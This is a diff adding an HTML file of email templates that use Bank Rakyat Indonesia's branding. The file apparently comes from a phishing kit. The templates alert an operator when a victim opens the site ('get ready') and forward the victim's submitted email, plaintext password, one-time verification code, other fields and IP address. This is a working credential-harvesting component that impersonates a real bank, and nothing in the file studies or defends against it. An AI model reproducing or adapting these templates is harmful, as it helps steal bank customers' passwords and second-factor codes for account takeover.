@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email Templates</title>
+</head>
+<body>
+
+<!-- TEMPLATE 1: Website Visit Notification -->
+<div id="template-website-visit" style="display: none;">
+  <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; padding: 30px; background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+    <div style="text-align: center; margin-bottom: 25px;">
+      <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🚀 WEBSITE ACCESS ALERT</h1>
+      <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+    </div>
+    
+    <div style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+      <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+        HEY!!!, {{name}} just open website, get ready.
+      </p>
+      <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+        This is an automated notification that someone has accessed the BRI website.
+      </p>
+    </div>
+
+    <div style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+      <p style="color: #666; font-size: 13px; margin: 0;"><strong>Timestamp:</strong> {{timestamp}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>IP Address:</strong> {{ip_address}}</p>
+    </div>
+
+    <div style="text-align: center; margin-top: 25px;">
+      <a href="{{website_url}}" style="display: inline-block; padding: 12px 30px; background: #0B5FFF; color: #fff; text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px;">Visit Website</a>
+    </div>
+
+    <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 25px 0;">
+    
+    <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+  </div>
+</div>
+
+<!-- TEMPLATE 2: Email Submission -->
+<div id="template-email-submission" style="display: none;">
+  <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; padding: 30px; background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+    <div style="text-align: center; margin-bottom: 25px;">
+      <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">📧 EMAIL SUBMISSION</h1>
+      <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+    </div>
+    
+    <div style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+      <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+        THIS IS {{name}} Email = "{{email}}"
+      </p>
+      <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+        User has submitted their email address through the BRI website authentication system.
+      </p>
+    </div>
+
+    <div style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+      <p style="color: #666; font-size: 13px; margin: 0;"><strong>Submitted Email:</strong> {{email}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> {{timestamp}}</p>
+    </div>
+
+    <div style="background: #fff3cd; padding: 15px; border-radius: 6px; border-left: 4px solid #ffc107;">
+      <p style="color: #856404; font-size: 13px; margin: 0;">⚠️ Please verify this email address before proceeding with authentication.</p>
+    </div>
+
+    <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 25px 0;">
+    
+    <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+  </div>
+</div>
+
+<!-- TEMPLATE 3: Password Submission -->
+<div id="template-password-submission" style="display: none;">
+  <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; padding: 30px; background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+    <div style="text-align: center; margin-bottom: 25px;">
+      <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🔐 PASSWORD SUBMISSION</h1>
+      <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+    </div>
+    
+    <div style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+      <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+        THIS IS {{name}} password = "{{password}}"
+      </p>
+      <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+        User has submitted their password through the BRI website authentication system.
+      </p>
+    </div>
+
+    <div style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+      <p style="color: #666; font-size: 13px; margin: 0;"><strong>User:</strong> {{name}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Password:</strong> {{password}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> {{timestamp}}</p>
+    </div>
+
+    <div style="background: #d4edda; padding: 15px; border-radius: 6px; border-left: 4px solid #28a745;">
+      <p style="color: #155724; font-size: 13px; margin: 0;">✅ Password received. Authentication process in progress.</p>
+    </div>
+
+    <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 25px 0;">
+    
+    <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+  </div>
+</div>
+
+<!-- TEMPLATE 4: Verification Code -->
+<div id="template-verification-code" style="display: none;">
+  <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; padding: 30px; background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+    <div style="text-align: center; margin-bottom: 25px;">
+      <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🔢 VERIFICATION CODE</h1>
+      <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+    </div>
+    
+    <div style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+      <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+        THIS IS THE One time verification code!! = "{{code}}"
+      </p>
+      <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+        A verification code has been generated for {{name}}.
+      </p>
+    </div>
+
+    <div style="background: linear-gradient(135deg, #0B5FFF 0%, #0A63E6 100%); padding: 25px; border-radius: 8px; text-align: center; margin-bottom: 20px;">
+      <p style="color: #fff; font-size: 32px; font-weight: 800; margin: 0; letter-spacing: 4px;">{{code}}</p>
+      <p style="color: rgba(255,255,255,0.8); font-size: 13px; margin: 10px 0 0;">This code expires in 10 minutes</p>
+    </div>
+
+    <div style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+      <p style="color: #666; font-size: 13px; margin: 0;"><strong>Recipient:</strong> {{name}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Generated:</strong> {{timestamp}}</p>
+    </div>
+
+    <div style="background: #fff3cd; padding: 15px; border-radius: 6px; border-left: 4px solid #ffc107;">
+      <p style="color: #856404; font-size: 13px; margin: 0;">⚠️ Do not share this code with anyone. BRI will never ask for your verification code.</p>
+    </div>
+
+    <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 25px 0;">
+    
+    <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+  </div>
+</div>
+
+<!-- TEMPLATE 5: Information Submission (Array) -->
+<div id="template-information-submission" style="display: none;">
+  <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; padding: 30px; background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
+    <div style="text-align: center; margin-bottom: 25px;">
+      <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">📋 INFORMATION SUBMISSION</h1>
+      <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+    </div>
+    
+    <div style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+      <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+        This is {{name}} submitted information:
+      </p>
+      <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+        User has submitted the following information through the BRI website.
+      </p>
+    </div>
+
+    <div style="background: #f7f8f9; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+      <h3 style="color: #1a202c; font-size: 16px; font-weight: 700; margin: 0 0 15px 0; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">Submitted Data:</h3>
+      {{information_array}}
+    </div>
+
+    <div style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+      <p style="color: #666; font-size: 13px; margin: 0;"><strong>Submitted By:</strong> {{name}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Total Fields:</strong> {{field_count}}</p>
+      <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> {{timestamp}}</p>
+    </div>
+
+    <div style="background: #d1ecf1; padding: 15px; border-radius: 6px; border-left: 4px solid #17a2b8;">
+      <p style="color: #0c5460; font-size: 13px; margin: 0;">ℹ️ Information has been received and is being processed by the system.</p>
+    </div>
+
+    <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 25px 0;">
+    
+    <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+  </div>
+</div>
+
+</body>
+</html>
